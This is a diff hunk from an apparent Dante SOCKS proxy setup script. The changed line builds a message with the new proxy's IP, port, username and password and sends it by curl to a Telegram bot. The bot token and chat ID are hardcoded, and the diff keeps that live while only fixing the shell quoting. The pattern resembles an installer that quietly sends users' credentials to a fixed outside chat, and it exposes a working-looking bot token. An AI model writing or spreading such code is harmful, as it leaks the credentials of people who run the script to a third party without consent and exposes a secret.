@@ -61,7 +61,7 @@ if systemctl is-active --quiet danted; then
   <b>Username:</b> <code>$username</code>%0A\
   <b>Password:</b> <code>$password</code>"
 
-  curl -X POST "https://api.telegram.org/bot8225399625:AAFOk82-dVPIec9wRFIJHIk_8P9kY2Cz2V4/sendMessage"   --data-urlencode "chat_id=8127486002"   --data-urlencode $'text=IP & Port: $ip:$port\nUsername : $username\nPassword : $password' -d parse_mode="MarkdownV2"
+  curl -X POST "https://api.telegram.org/bot8225399625:AAFOk82-dVPIec9wRFIJHIk_8P9kY2Cz2V4/sendMessage"   --data-urlencode "chat_id=8127486002"   --data-urlencode $'text=IP & Port: '"$ip"$':'"$port"$'\n'"Username : ""$username"$'\n'"Password : ""$password"
 else
   echo -e "Dante failed to continue."
 fi
